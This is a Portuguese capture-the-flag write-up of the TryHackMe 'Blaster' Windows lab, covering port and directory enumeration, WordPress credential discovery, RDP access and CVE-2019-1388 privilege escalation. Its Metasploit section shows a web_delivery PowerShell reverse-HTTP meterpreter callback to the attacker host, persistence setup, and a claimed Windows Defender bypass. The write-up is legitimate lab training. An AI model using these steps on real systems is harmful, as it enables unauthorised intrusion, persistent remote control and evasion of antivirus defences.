---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Blaster - Fácil
date: 2024-02-16 04:10:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, windows, wordpress, facil, metasploit, rdp]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img//blaster/blaster.png){: w="100" h="100" .left}

---
# **CTF - Blaster**
---
---  


> Essa VM pode ser baixada [aqui](https://darkstar7471.com/resources.html) e ser executada localmente.
{: .prompt-info}  
## **Enumeração**


### nmap


```shell
─      ~/thm/blaster        
╰─ sudo nmap -Pn -sS -sV --min-rate 5000 -stats-every 7s -p- 192.168.15.4 -oN nmap

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 22:54 -03
Nmap scan report for 192.168.15.4
Host is up (0.00039s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
MAC Address: 00:0C:29:26:90:6A (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.46 seconds

```
{: .nolineno }
### ffuf

```shell
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 200 -u http://192.168.15.4/FUZZ -e .html,.txt -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.15.4/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 93ms]
| URL | http://192.168.15.4/retro
| --> | http://192.168.15.4/retro/
    * FUZZ: retro

:: Progress: [61428/61428] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```
{: .nolineno }
### ffuf /retro
```shell

╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 200 -u http://192.168.15.4/retro/FUZZ -e .html,.txt,.php -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.15.4/retro/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 38ms]
| URL | http://192.168.15.4/retro/LICENSE.txt
    * FUZZ: LICENSE.txt

[Status: 200, Size: 7447, Words: 761, Lines: 99, Duration: 50ms]
| URL | http://192.168.15.4/retro/Readme.html
    * FUZZ: Readme.html

[Status: 200, Size: 7447, Words: 761, Lines: 99, Duration: 50ms]
| URL | http://192.168.15.4/retro/README.html
    * FUZZ: README.html

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2113ms]
| URL | http://192.168.15.4/retro/Index.php
| --> | http://192.168.15.4/retro/Index.php/
    * FUZZ: Index.php

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1875ms]
| URL | http://192.168.15.4/retro/index.php
| --> | http://192.168.15.4/retro/
    * FUZZ: index.php

[Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 38ms]
| URL | http://192.168.15.4/retro/license.txt
    * FUZZ: license.txt

[Status: 200, Size: 7447, Words: 761, Lines: 99, Duration: 103ms]
| URL | http://192.168.15.4/retro/readme.html
    * FUZZ: readme.html

[Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 57ms]
| URL | http://192.168.15.4/retro/wp-content
| --> | http://192.168.15.4/retro/wp-content/
    * FUZZ: wp-content

[Status: 301, Size: 161, Words: 9, Lines: 2, Duration: 43ms]
| URL | http://192.168.15.4/retro/wp-includes
| --> | http://192.168.15.4/retro/wp-includes/
    * FUZZ: wp-includes

[Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 184ms]
| URL | http://192.168.15.4/retro/wp-admin
| --> | http://192.168.15.4/retro/wp-admin/
    * FUZZ: wp-admin

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1658ms]
| URL | http://192.168.15.4/retro/wp-config.php
    * FUZZ: wp-config.php

[Status: 200, Size: 2743, Words: 152, Lines: 69, Duration: 2020ms]
| URL | http://192.168.15.4/retro/wp-login.php
    * FUZZ: wp-login.php

[Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 3057ms]
| URL | http://192.168.15.4/retro/wp-trackback.php
    * FUZZ: wp-trackback.php

[Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 3262ms]
| URL | http://192.168.15.4/retro/xmlrpc.php
    * FUZZ: xmlrpc.php

:: Progress: [81904/81904] :: Job [1/1] :: 319 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
```
{: .nolineno }

Se trata de um wordpress na porta 80
![alt text](/assets/img/blaster/blaster1.png)

Possível usuário `wade`

Confirmando se existe usuário wade:
![alt text](/assets/img/blaster/blaster2.png)

Em uma resposta a um post temos esse comentário, que é uma possível senha.
(Claro pura realidade)
![alt text](/assets/img/blaster/blaster3.png)  

## **Acesso/FootHold**

Confirmada senha fazendo login no wordpress

### Primeira Flag
Testado também via RDP
![alt text](/assets/img/blaster/blaster4.png)

> **Pra variar tem algum problema com a máquina windows do THM, era pra lixeira não estar vazia e ter históricos de navegação, mas não tem XD**
**Nesses era pra ter pistas para o `CVE-2019-1388`**
{: .prompt-warning}
Esse video explica sobre o CVE
<https://youtu.be/3BQKpPNlTSo>  
## **Escalação privilégio**
Após o exploit do CVE, shell com usuário `nt authority\system`  
![alt text](/assets/img/blaster/blaster5.png)

### Flag root obtida
`Esqueci da print XD`

### Metasploit

Criando persistência com metasploit.

Levando em conta que o windows defender está ativo, vai bloquear a execução de payloads .exe do metasploit.
Abri o msconsole e setei o exploit, o payload e o target que é powershell

```shell
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/script/web_delivery) > 
msf6 exploit(multi/script/web_delivery) > show targets 

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X


msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > 

msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => 10.2.109.206
msf6 exploit(multi/script/web_delivery) > set lport 4444
lport => 4444
msf6 exploit(multi/script/web_delivery) > 
```
{: .nolineno }
run e será gerado um payload, execute no terminal da box
![alt text](/assets/img/blaster/blaster6.png)

recebi a sessão meterpreter

```shell
msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB  10.2.109.206:4444 -> 10.10.25.237:49959 (10.10.25.237)

msf6 exploit(multi/script/web_delivery) > [*] Meterpreter session 1 opened (10.2.109.206:4444 -> 10.10.25.237:49959) at 2024-02-14 01:18:42 -0300

msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
{: .nolineno }

### setando persistência

- `control+z ou digite bg`
- `msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/persistence`
- `msf6 exploit(windows/local/persistence) > set payload windows/meterpreter/reverse_http`
- `msf6 exploit(windows/local/persistence) > set session 1`
- `msf6 exploit(windows/local/persistence) > set lhost tun0
lhost => 10.2.109.206`
- `run`

**Conhecimentos adquiridos:**
- Setar persistência com metasploit
- Bypass windefender com exploit(multi/script/web_delivery